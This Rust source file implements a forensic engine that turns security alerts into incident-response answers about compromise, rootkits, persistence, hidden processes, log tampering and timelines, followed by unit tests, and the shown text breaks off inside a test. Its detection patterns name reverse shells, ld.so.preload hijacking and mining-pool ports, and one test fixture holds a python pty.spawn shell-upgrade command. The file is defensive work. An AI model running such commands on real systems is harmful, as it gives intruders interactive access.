//! Forensic analysis engine — synthesizes raw alerts into IR question answers.
//!
//! Takes detection engine output (alerts + raw artifact data) and produces
//! structured forensic interpretations answering standard IR questions:
//! "Is the system compromised?", "Is there a rootkit?", "When did it happen?"
//!
//! Follows the Question → Evidence → Confidence → Interpretation pattern
//! from usnjrnl-forensic's triage system, adapted for Linux/Windows UAC data.

use super::alerts::{Alert, AlertInput, AlertSeverity};

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/// Tier of forensic question (determines priority in report).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Tier {
    /// Tier 1: What happened? (system compromise, initial access, malware)
    WhatHappened = 0,
    /// Tier 2: How bad is it? (rootkit, resource abuse, persistence)
    HowBad = 1,
    /// Tier 3: Ongoing risk? (active access, lateral movement)
    OngoingRisk = 2,
    /// Tier 4: Cover-up? (hidden processes, evidence tampering)
    CoverUp = 3,
    /// Tier 5: Timeline reconstruction
    Timeline = 4,
}

/// Answer to a forensic question.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Answer {
    /// Evidence supports a positive answer.
    Yes,
    /// No evidence found.
    No,
    /// Some indicators present but insufficient for a definitive answer.
    Inconclusive,
}

/// A single piece of evidence supporting an analysis result.
#[derive(Debug, Clone)]
pub struct Finding {
    /// What was found (e.g., "diamorphine kernel module loaded").
    pub evidence: String,
    /// Which detection engine / data source produced this.
    pub source: String,
    /// Confidence in this individual finding (0.0–1.0).
    pub confidence: f64,
}

/// Result of analyzing one forensic question.
#[derive(Debug, Clone)]
pub struct AnalysisResult {
    /// Unique question identifier (e.g., "rootkit_present").
    pub question_id: &'static str,
    /// Question tier (determines display priority).
    pub tier: Tier,
    /// Human-readable category (e.g., "How Bad Is It?").
    pub category: &'static str,
    /// The forensic question being answered.
    pub question: &'static str,
    /// Yes / No / Inconclusive.
    pub answer: Answer,
    /// Evidence items supporting the answer.
    pub findings: Vec<Finding>,
    /// Narrative interpretation synthesizing all findings.
    pub interpretation: String,
    /// Overall confidence (0.0–1.0), derived from findings.
    pub confidence: f64,
    /// Relevant MITRE ATT&CK technique IDs.
    pub mitre_techniques: Vec<&'static str>,
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Run all forensic analyses against alerts and raw artifact data.
///
/// Returns results sorted by tier (Tier 1 first), then by confidence (highest first).
#[must_use]
pub fn analyze(alerts: &[Alert], input: &AlertInput<'_>) -> Vec<AnalysisResult> {
    let mut results = Vec::new();

    results.push(analyze_system_compromised(alerts));
    results.push(analyze_initial_access(alerts, input));
    results.push(analyze_malware_tools(alerts, input));
    results.push(analyze_rootkit_present(alerts));
    results.push(analyze_resource_abuse(alerts, input));
    results.push(analyze_persistence(alerts, input));
    results.push(analyze_active_access(alerts, input));
    results.push(analyze_lateral_movement(alerts, input));
    results.push(analyze_hidden_processes(alerts));
    results.push(analyze_evidence_tampering(alerts, input));
    results.push(analyze_attack_timeline(alerts, input));

    results.sort_by(|a, b| {
        a.tier.cmp(&b.tier).then(
            b.confidence
                .partial_cmp(&a.confidence)
                .unwrap_or(std::cmp::Ordering::Equal),
        )
    });
    results
}

// ---------------------------------------------------------------------------
// Per-question analyzers
// ---------------------------------------------------------------------------

/// Tier 1: Is the system compromised?
fn analyze_system_compromised(alerts: &[Alert]) -> AnalysisResult {
    let mut findings = Vec::new();

    let critical_count = alerts
        .iter()
        .filter(|a| a.severity == AlertSeverity::Critical)
        .count();
    let warning_count = alerts
        .iter()
        .filter(|a| a.severity == AlertSeverity::Warning)
        .count();

    // Rootkit indicators are strongest evidence of compromise
    for alert in alerts {
        if alert.severity == AlertSeverity::Critical {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: alert.category.clone(),
                confidence: 0.9,
            });
        }
    }

    // Warning-level alerts contribute lower confidence
    for alert in alerts {
        if alert.severity == AlertSeverity::Warning && findings.len() < 10 {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: alert.category.clone(),
                confidence: 0.5,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let interpretation = if answer == Answer::Yes {
        format!(
            "The system shows strong indicators of compromise. \
             {} critical and {} warning-level findings detected across multiple categories. \
             Immediate incident response is recommended.",
            critical_count, warning_count
        )
    } else if answer == Answer::Inconclusive {
        format!(
            "Some suspicious activity detected ({} warnings) but no definitive indicators \
             of compromise. Further investigation recommended.",
            warning_count
        )
    } else {
        "No indicators of compromise detected in the available evidence.".to_string()
    };

    AnalysisResult {
        question_id: "system_compromised",
        tier: Tier::WhatHappened,
        category: "What Happened?",
        question: "Is the system compromised?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["TA0001"] // Initial Access tactic
        } else {
            vec![]
        },
    }
}

/// Tier 1: How did the attacker gain initial access?
fn analyze_initial_access(alerts: &[Alert], _input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // Look for reverse shell indicators
    for alert in alerts {
        if alert.message.contains("Reverse shell") || alert.message.contains("pty.spawn") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "process".to_string(),
                confidence: 0.9,
            });
        }
    }

    // Check for SSH from non-jump-host IPs (unusual login sources)
    for alert in alerts {
        if alert.category == "auth" && alert.message.contains("unique login source") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "auth".to_string(),
                confidence: 0.6,
            });
        }
    }

    // Check for brute-force indicators
    for alert in alerts {
        if alert.message.contains("brute") || alert.message.contains("Brute") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: alert.category.clone(),
                confidence: 0.7,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let has_reverse_shell = findings
        .iter()
        .any(|f| f.evidence.contains("pty.spawn") || f.evidence.contains("Reverse shell"));

    let interpretation = if has_reverse_shell {
        "Initial access appears to involve a reverse shell (pty.spawn detected in process listing). \
         This is typically achieved via an exploited service or phished credential, \
         followed by shell upgrade for interactive access."
            .to_string()
    } else if answer == Answer::Yes {
        "Evidence suggests unauthorized access occurred. Review login records and \
         network connections for the initial entry vector."
            .to_string()
    } else {
        "No clear initial access vector identified in the available evidence.".to_string()
    };

    AnalysisResult {
        question_id: "initial_access",
        tier: Tier::WhatHappened,
        category: "What Happened?",
        question: "How did the attacker gain initial access?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if has_reverse_shell {
            vec!["T1059.004", "T1071.001"] // Command and Scripting: Unix Shell, App Layer Protocol
        } else {
            vec![]
        },
    }
}

/// Tier 1: What malware or tools are present?
fn analyze_malware_tools(alerts: &[Alert], _input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // Rootkit detections
    for alert in alerts {
        if alert.category == "rootkit" || alert.category == "malware" {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: alert.category.clone(),
                confidence: if alert.severity == AlertSeverity::Critical {
                    0.95
                } else {
                    0.6
                },
            });
        }
    }

    // Executables in temp directories
    for alert in alerts {
        if alert.message.contains("Executable in temp directory") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "filesystem".to_string(),
                confidence: 0.5,
            });
        }
    }

    // SUID outside standard paths
    for alert in alerts {
        if alert.message.contains("SUID binary outside standard path") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "filesystem".to_string(),
                confidence: 0.8,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    // Build malware inventory from findings
    let malware_names: Vec<&str> = findings
        .iter()
        .filter(|f| f.source == "rootkit" || f.source == "malware")
        .map(|f| f.evidence.as_str())
        .collect();

    let interpretation = if !malware_names.is_empty() {
        format!(
            "Malware detected on the system: {}. \
             These should be treated as indicators of a targeted attack. \
             Collect hashes for threat intelligence correlation.",
            malware_names.join("; ")
        )
    } else if answer == Answer::Inconclusive {
        "Suspicious files found but no confirmed malware identified. \
         Manual review of temporary directory contents and unusual SUID binaries recommended."
            .to_string()
    } else {
        "No malware or attacker tools identified in the available evidence.".to_string()
    };

    AnalysisResult {
        question_id: "malware_tools",
        tier: Tier::WhatHappened,
        category: "What Happened?",
        question: "What malware or tools are present on the system?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1014", "T1036"] // Rootkit, Masquerading
        } else {
            vec![]
        },
    }
}

/// Tier 2: Is there a rootkit hiding attacker activity?
fn analyze_rootkit_present(alerts: &[Alert]) -> AnalysisResult {
    let mut findings = Vec::new();

    // chkrootkit INFECTED
    for alert in alerts {
        if alert.message.contains("chkrootkit INFECTED") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "malware".to_string(),
                confidence: 0.95,
            });
        }
    }

    // Known rootkit kernel modules
    for alert in alerts {
        if (alert.category == "rootkit" || alert.category == "malware")
            && alert.message.contains("known_rootkit_module")
        {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "malware".to_string(),
                confidence: 0.95,
            });
        }
    }

    // ld.so.preload hijack
    for alert in alerts {
        if alert.message.contains("ld.so.preload") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "config".to_string(),
                confidence: 0.85,
            });
        }
    }

    // Unattributed connections (process hiding)
    for alert in alerts {
        if alert.message.contains("Unattributed") && alert.message.contains("no PID") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "network".to_string(),
                confidence: 0.8,
            });
        }
    }

    // Compound rootkit indicators
    for alert in alerts {
        if alert.message.contains("Compound rootkit") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "malware".to_string(),
                confidence: 0.9,
            });
        }
    }

    // Kernel taint
    for alert in alerts {
        if alert.message.contains("kernel_taint") || alert.message.contains("unsigned") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "malware".to_string(),
                confidence: 0.6,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let rootkit_name = findings
        .iter()
        .find(|f| f.evidence.contains("INFECTED"))
        .map(|f| {
            f.evidence
                .strip_prefix("chkrootkit INFECTED: ")
                .unwrap_or(&f.evidence)
                .to_string()
        });

    let interpretation = if let Some(ref name) = rootkit_name {
        format!(
            "A kernel-level rootkit ({name}) is installed and actively hiding attacker activity. \
             Evidence includes chkrootkit detection, non-standard kernel modules, \
             and network connections with no attributed process. \
             The rootkit intercepts system calls to hide processes, files, and connections \
             from userland monitoring tools (ps, ls, netstat, ss)."
        )
    } else if answer == Answer::Yes {
        "Rootkit indicators detected including process hiding (unattributed connections) \
         and/or ld.so.preload userland hooking. The attacker is actively concealing \
         their presence on the system."
            .to_string()
    } else if answer == Answer::Inconclusive {
        "Some rootkit-like indicators present but insufficient for a definitive determination. \
         Manual kernel module analysis recommended."
            .to_string()
    } else {
        "No rootkit indicators detected.".to_string()
    };

    AnalysisResult {
        question_id: "rootkit_present",
        tier: Tier::HowBad,
        category: "How Bad Is It?",
        question: "Is there a rootkit hiding attacker activity?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1014", "T1547.006", "T1574.006"] // Rootkit, Kernel Modules, LD_PRELOAD
        } else {
            vec![]
        },
    }
}

/// Tier 2: Is there unauthorized resource usage?
fn analyze_resource_abuse(alerts: &[Alert], _input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // High CPU with hidden processes = likely cryptominer
    let has_hidden_processes = alerts
        .iter()
        .any(|a| a.message.contains("Unattributed") || a.message.contains("no PID"));

    let has_rootkit = alerts.iter().any(|a| {
        a.message.contains("chkrootkit INFECTED")
            || a.message.contains("known_rootkit_module")
            || a.message.contains("Compound rootkit")
    });

    if has_hidden_processes && has_rootkit {
        findings.push(Finding {
            evidence: "Hidden processes detected alongside rootkit — consistent with \
                       cryptominer concealment pattern"
                .to_string(),
            source: "correlation".to_string(),
            confidence: 0.85,
        });
    }

    // Suspicious network connections (C2 or mining pool)
    for alert in alerts {
        if alert.category == "network" && alert.message.contains("External connection") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "network".to_string(),
                confidence: 0.5,
            });
        }
    }

    // Suspicious listeners (backdoor or mining proxy)
    for alert in alerts {
        if alert.message.contains("Suspicious listener") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "network".to_string(),
                confidence: 0.6,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let interpretation = if has_hidden_processes && has_rootkit {
        "The combination of a rootkit hiding processes and unattributed network connections \
         is strongly consistent with a cryptominer. The rootkit hides the mining process \
         from tools like `ps` and `top`, explaining why the SOC observes high CPU usage \
         but cannot identify the responsible process. Check for connections to known \
         mining pools (ports 3333, 4444, 5555, 8333, 14433)."
            .to_string()
    } else if answer == Answer::Yes {
        "Suspicious resource usage patterns detected. External network connections \
         and/or suspicious listeners suggest unauthorized activity."
            .to_string()
    } else {
        "No clear evidence of unauthorized resource usage in the available data.".to_string()
    };

    AnalysisResult {
        question_id: "resource_abuse",
        tier: Tier::HowBad,
        category: "How Bad Is It?",
        question: "Is there unauthorized resource usage (cryptomining, etc.)?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1496"] // Resource Hijacking
        } else {
            vec![]
        },
    }
}

/// Tier 2: Has the attacker established persistence?
fn analyze_persistence(alerts: &[Alert], _input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // Crontab persistence
    for alert in alerts {
        if alert.category == "config" && alert.message.contains("crontab") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "config".to_string(),
                confidence: 0.7,
            });
        }
    }

    // Crontab-bodyfile correlation
    for alert in alerts {
        if alert.message.contains("Crontab references")
            && alert.message.contains("outside standard paths")
        {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "persistence".to_string(),
                confidence: 0.8,
            });
        }
    }

    // ld.so.preload (persistence via shared library injection)
    for alert in alerts {
        if alert.message.contains("ld.so.preload") && alert.severity == AlertSeverity::Critical {
            findings.push(Finding {
                evidence: "ld.so.preload persistence: shared library injected into every process"
                    .to_string(),
                source: "config".to_string(),
                confidence: 0.9,
            });
        }
    }

    // Kernel module persistence
    for alert in alerts {
        if (alert.category == "rootkit" || alert.category == "malware")
            && (alert.message.contains("kernel") || alert.message.contains("module"))
        {
            findings.push(Finding {
                evidence: format!("Kernel module persistence: {}", alert.message),
                source: "malware".to_string(),
                confidence: 0.85,
            });
        }
    }

    // Windows: service installs, scheduled tasks
    for alert in alerts {
        if alert.message.contains("Service installed") || alert.message.contains("Scheduled task") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "windows-persistence".to_string(),
                confidence: 0.75,
            });
        }
    }

    // SSH authorized_keys modification
    for alert in alerts {
        if alert.message.contains("authorized_keys") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "config".to_string(),
                confidence: 0.8,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let mechanisms: Vec<&str> = findings
        .iter()
        .map(|f| f.source.as_str())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let interpretation = if answer == Answer::Yes {
        format!(
            "The attacker has established persistence through {} mechanism(s): {}. \
             These ensure continued access even after system reboot or credential rotation.",
            mechanisms.len(),
            mechanisms.join(", ")
        )
    } else if answer == Answer::Inconclusive {
        "Some persistence indicators found but not conclusive. Review crontab and startup \
         configurations manually."
            .to_string()
    } else {
        "No persistence mechanisms detected.".to_string()
    };

    AnalysisResult {
        question_id: "persistence_established",
        tier: Tier::HowBad,
        category: "How Bad Is It?",
        question: "Has the attacker established persistence mechanisms?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1053.003", "T1547.006", "T1574.006"] // Cron, Kernel Modules, LD_PRELOAD
        } else {
            vec![]
        },
    }
}

/// Tier 3: Does the attacker have ongoing access?
fn analyze_active_access(alerts: &[Alert], _input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // Active reverse shells
    for alert in alerts {
        if alert.message.contains("Reverse shell") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "process".to_string(),
                confidence: 0.9,
            });
        }
    }

    // Active suspicious listeners
    for alert in alerts {
        if alert.message.contains("Suspicious listener") || alert.message.contains("backdoor") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "network".to_string(),
                confidence: 0.7,
            });
        }
    }

    // External established connections
    for alert in alerts {
        if alert.category == "network" && alert.message.contains("External connection") {
            findings.push(Finding {
                evidence: alert.detail.clone(),
                source: "network".to_string(),
                confidence: 0.5,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let interpretation = if findings
        .iter()
        .any(|f| f.evidence.contains("Reverse shell"))
    {
        "The attacker has an active reverse shell on the system, providing real-time \
         interactive access. This is a live intrusion requiring immediate containment."
            .to_string()
    } else if answer == Answer::Yes {
        "Active network indicators suggest the attacker currently has access. \
         Suspicious listeners and/or external connections are present."
            .to_string()
    } else {
        "No indicators of active attacker access at the time of collection.".to_string()
    };

    AnalysisResult {
        question_id: "active_access",
        tier: Tier::OngoingRisk,
        category: "Ongoing Risk?",
        question: "Does the attacker have ongoing access to the system?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1059.004", "T1090"] // Unix Shell, Proxy/Tunnel
        } else {
            vec![]
        },
    }
}

/// Tier 3: Evidence of lateral movement?
fn analyze_lateral_movement(alerts: &[Alert], _input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // Internal pivoting (RFC1918 to RFC1918 on non-standard ports)
    for alert in alerts {
        if alert.message.contains("pivot") || alert.message.contains("internal") {
            if alert.category == "network" {
                findings.push(Finding {
                    evidence: format!("{}: {}", alert.message, alert.detail),
                    source: "network".to_string(),
                    confidence: 0.7,
                });
            }
        }
    }

    // SSH to non-jump-host addresses
    for alert in alerts {
        if alert.category == "auth" && alert.message.contains("unique login source") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "auth".to_string(),
                confidence: 0.5,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let interpretation = if answer == Answer::Yes {
        "Network evidence suggests lateral movement activity — connections to internal \
         hosts on non-standard ports or from unexpected source addresses."
            .to_string()
    } else {
        "No clear indicators of lateral movement in the available evidence.".to_string()
    };

    AnalysisResult {
        question_id: "lateral_movement",
        tier: Tier::OngoingRisk,
        category: "Ongoing Risk?",
        question: "Is there evidence of lateral movement or pivoting?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1021", "T1570"] // Remote Services, Lateral Tool Transfer
        } else {
            vec![]
        },
    }
}

/// Tier 4: Are processes being hidden?
fn analyze_hidden_processes(alerts: &[Alert]) -> AnalysisResult {
    let mut findings = Vec::new();

    for alert in alerts {
        if alert.message.contains("Unattributed") && alert.message.contains("no PID") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "network".to_string(),
                confidence: 0.85,
            });
        }
    }

    // Rootkit compound indicators mentioning hidden processes
    for alert in alerts {
        if alert.message.contains("hidden") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "malware".to_string(),
                confidence: 0.9,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let interpretation = if answer == Answer::Yes {
        "Active network connections exist with no attributed process ID, indicating \
         process hiding via kernel-level rootkit. The rootkit intercepts system calls \
         (getdents, read on /proc) to filter hidden PIDs from userland tools."
            .to_string()
    } else {
        "No evidence of process hiding detected.".to_string()
    };

    AnalysisResult {
        question_id: "hidden_processes",
        tier: Tier::CoverUp,
        category: "Cover-Up?",
        question: "Are processes being hidden from monitoring tools?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1014", "T1564.001"] // Rootkit, Hidden Files and Directories
        } else {
            vec![]
        },
    }
}

/// Tier 4: Has evidence been tampered with?
fn analyze_evidence_tampering(alerts: &[Alert], _input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // Windows: log clearing
    for alert in alerts {
        if alert.message.contains("log cleared") || alert.message.contains("Log cleared") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "windows-integrity".to_string(),
                confidence: 0.9,
            });
        }
    }

    // Timestamp anomalies
    for alert in alerts {
        if alert.message.contains("timestamp") && alert.message.contains("anomal") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "filesystem".to_string(),
                confidence: 0.7,
            });
        }
    }

    // Audit policy changes
    for alert in alerts {
        if alert.message.contains("Audit policy") {
            findings.push(Finding {
                evidence: alert.message.clone(),
                source: "windows-integrity".to_string(),
                confidence: 0.8,
            });
        }
    }

    let confidence = compute_confidence(&findings);
    let answer = classify_answer(confidence);

    let interpretation = if answer == Answer::Yes {
        "Evidence of anti-forensic activity detected. The attacker has attempted \
         to cover their tracks by clearing logs and/or manipulating timestamps."
            .to_string()
    } else {
        "No evidence of deliberate evidence tampering detected.".to_string()
    };

    AnalysisResult {
        question_id: "evidence_tampering",
        tier: Tier::CoverUp,
        category: "Cover-Up?",
        question: "Has evidence been tampered with or destroyed?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: if answer == Answer::Yes {
            vec!["T1070.001", "T1070.006"] // Clear Event Logs, Timestomp
        } else {
            vec![]
        },
    }
}

/// Tier 5: Reconstruct the attack timeline.
fn analyze_attack_timeline(alerts: &[Alert], input: &AlertInput<'_>) -> AnalysisResult {
    let mut findings = Vec::new();

    // Temporal burst detection
    for alert in alerts {
        if alert.message.contains("Temporal burst") || alert.message.contains("Sustained") {
            findings.push(Finding {
                evidence: format!("{}: {}", alert.message, alert.detail),
                source: "filesystem".to_string(),
                confidence: 0.7,
            });
        }
    }

    // Collect all critical/warning alerts as timeline events
    let significant_alerts: Vec<&Alert> = alerts
        .iter()
        .filter(|a| a.severity == AlertSeverity::Critical || a.severity == AlertSeverity::Warning)
        .collect();

    if !significant_alerts.is_empty() {
        findings.push(Finding {
            evidence: format!(
                "{} significant events across {} categories",
                significant_alerts.len(),
                significant_alerts
                    .iter()
                    .map(|a| a.category.as_str())
                    .collect::<std::collections::HashSet<_>>()
                    .len()
            ),
            source: "correlation".to_string(),
            confidence: 0.6,
        });
    }

    // Bodyfile timeline entries provide filesystem activity timing
    if !input.bodyfile.is_empty() {
        findings.push(Finding {
            evidence: format!(
                "{} bodyfile entries available for timeline reconstruction",
                input.bodyfile.len()
            ),
            source: "bodyfile".to_string(),
            confidence: 0.5,
        });
    }

    // Login records provide session timing
    if !input.logins.is_empty() {
        findings.push(Finding {
            evidence: format!(
                "{} login records available for session analysis",
                input.logins.len()
            ),
            source: "auth".to_string(),
            confidence: 0.5,
        });
    }

    let confidence = compute_confidence(&findings);
    let answer = if significant_alerts.is_empty() {
        Answer::No
    } else {
        Answer::Yes
    };

    let categories: Vec<&str> = significant_alerts
        .iter()
        .map(|a| a.category.as_str())
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let interpretation = if answer == Answer::Yes {
        format!(
            "Attack timeline can be reconstructed from {} significant findings \
             spanning categories: {}. \
             Correlate bodyfile timestamps with login records and network activity \
             to establish the precise sequence of compromise → persistence → exploitation.",
            significant_alerts.len(),
            categories.join(", ")
        )
    } else {
        "Insufficient data to reconstruct an attack timeline.".to_string()
    };

    AnalysisResult {
        question_id: "attack_timeline",
        tier: Tier::Timeline,
        category: "Timeline",
        question: "What is the chronological sequence of the attack?",
        answer,
        findings,
        interpretation,
        confidence,
        mitre_techniques: vec![],
    }
}

// ---------------------------------------------------------------------------
// Confidence helpers
// ---------------------------------------------------------------------------

/// Compute aggregate confidence from multiple findings.
///
/// Uses a "1 - product of (1 - individual)" formula: each finding independently
/// contributes to overall confidence. Multiple corroborating findings increase
/// confidence more than any single finding alone.
fn compute_confidence(findings: &[Finding]) -> f64 {
    if findings.is_empty() {
        return 0.0;
    }

    // 1 - product(1 - c_i) for each finding
    let complement_product: f64 = findings.iter().map(|f| 1.0 - f.confidence).product();
    1.0 - complement_product
}

/// Classify confidence into an Answer.
fn classify_answer(confidence: f64) -> Answer {
    if confidence >= 0.7 {
        Answer::Yes
    } else if confidence >= 0.3 {
        Answer::Inconclusive
    } else {
        Answer::No
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::investigation::alerts::AlertInput;
    use issen_parser_uac::parsers::bodyfile::BodyfileEntry;

    fn empty_input() -> AlertInput<'static> {
        AlertInput {
            bodyfile: &[],
            network: &[],
            processes: &[],
            crontabs: &[],
            chkrootkit: &[],
            rootkit_findings: &[],
            configs: &[],
            hashes: &[],
            packages: &[],
            logins: &[],
            windows_events: &[],
            mft_entries: &[],
            connection_log: &[],
        }
    }

    fn alert(severity: AlertSeverity, category: &str, message: &str, detail: &str) -> Alert {
        Alert {
            severity,
            category: category.to_string(),
            message: message.to_string(),
            detail: detail.to_string(),
        }
    }

    // ── Confidence scoring tests ────────────────────────────────

    #[test]
    fn confidence_empty_findings_is_zero() {
        assert_eq!(compute_confidence(&[]), 0.0);
    }

    #[test]
    fn confidence_single_finding() {
        let findings = vec![Finding {
            evidence: "test".to_string(),
            source: "test".to_string(),
            confidence: 0.8,
        }];
        let c = compute_confidence(&findings);
        assert!((c - 0.8).abs() < 0.001);
    }

    #[test]
    fn confidence_multiple_findings_increases() {
        let single = vec![Finding {
            evidence: "a".into(),
            source: "a".into(),
            confidence: 0.6,
        }];
        let double = vec![
            Finding {
                evidence: "a".into(),
                source: "a".into(),
                confidence: 0.6,
            },
            Finding {
                evidence: "b".into(),
                source: "b".into(),
                confidence: 0.6,
            },
        ];
        assert!(compute_confidence(&double) > compute_confidence(&single));
    }

    #[test]
    fn confidence_two_at_60_pct_gives_84_pct() {
        let findings = vec![
            Finding {
                evidence: "a".into(),
                source: "a".into(),
                confidence: 0.6,
            },
            Finding {
                evidence: "b".into(),
                source: "b".into(),
                confidence: 0.6,
            },
        ];
        let c = compute_confidence(&findings);
        // 1 - (0.4 * 0.4) = 1 - 0.16 = 0.84
        assert!((c - 0.84).abs() < 0.001);
    }

    #[test]
    fn classify_answer_thresholds() {
        assert_eq!(classify_answer(0.0), Answer::No);
        assert_eq!(classify_answer(0.29), Answer::No);
        assert_eq!(classify_answer(0.3), Answer::Inconclusive);
        assert_eq!(classify_answer(0.5), Answer::Inconclusive);
        assert_eq!(classify_answer(0.69), Answer::Inconclusive);
        assert_eq!(classify_answer(0.7), Answer::Yes);
        assert_eq!(classify_answer(1.0), Answer::Yes);
    }

    // ── Empty input tests ───────────────────────────────────────

    #[test]
    fn empty_input_produces_all_no_answers() {
        let results = analyze(&[], &empty_input());
        assert_eq!(results.len(), 11);
        for result in &results {
            assert_eq!(
                result.answer,
                Answer::No,
                "question '{}' should be No on empty input",
                result.question_id
            );
            assert_eq!(result.confidence, 0.0);
            assert!(result.findings.is_empty());
        }
    }

    #[test]
    fn empty_input_results_sorted_by_tier() {
        let results = analyze(&[], &empty_input());
        for window in results.windows(2) {
            assert!(window[0].tier <= window[1].tier);
        }
    }

    // ── System compromised tests ────────────────────────────────

    #[test]
    fn system_compromised_yes_on_critical_alerts() {
        let alerts = vec![
            alert(
                AlertSeverity::Critical,
                "rootkit",
                "chkrootkit INFECTED: diamorphine",
                "diamorphine found",
            ),
            alert(
                AlertSeverity::Critical,
                "process",
                "Reverse shell indicator: pty.spawn",
                "pid=999",
            ),
        ];
        let result = analyze_system_compromised(&alerts);
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.confidence >= 0.7);
        assert!(result
            .interpretation
            .contains("strong indicators of compromise"));
    }

    #[test]
    fn system_compromised_inconclusive_on_warnings_only() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "network",
            "External connection to 8.8.8.8",
            "details",
        )];
        let result = analyze_system_compromised(&alerts);
        assert_eq!(result.answer, Answer::Inconclusive);
    }

    // ── Initial access tests ────────────────────────────────────

    #[test]
    fn initial_access_detects_reverse_shell() {
        let alerts = vec![alert(
            AlertSeverity::Critical,
            "process",
            "Reverse shell indicator: pty.spawn",
            "pid=999 user=worker cmd=python3 -c import pty; pty.spawn(\"/bin/bash\")",
        )];
        let result = analyze_initial_access(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("reverse shell"));
        assert!(result.mitre_techniques.contains(&"T1059.004"));
    }

    #[test]
    fn initial_access_no_on_empty() {
        let result = analyze_initial_access(&[], &empty_input());
        assert_eq!(result.answer, Answer::No);
    }

    // ── Malware tools tests ─────────────────────────────────────

    #[test]
    fn malware_tools_detects_rootkit_category() {
        let alerts = vec![
            alert(
                AlertSeverity::Critical,
                "rootkit",
                "[known_rootkit_module] diamorphine loaded",
                "lsmod",
            ),
            alert(
                AlertSeverity::Warning,
                "rootkit",
                "[kernel_taint] unsigned module",
                "taint=12289",
            ),
        ];
        let result = analyze_malware_tools(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Yes);
        assert!(!result.findings.is_empty());
    }

    #[test]
    fn malware_tools_detects_temp_executables() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "filesystem",
            "Executable in temp directory: /tmp/evil.elf",
            "mode=100755",
        )];
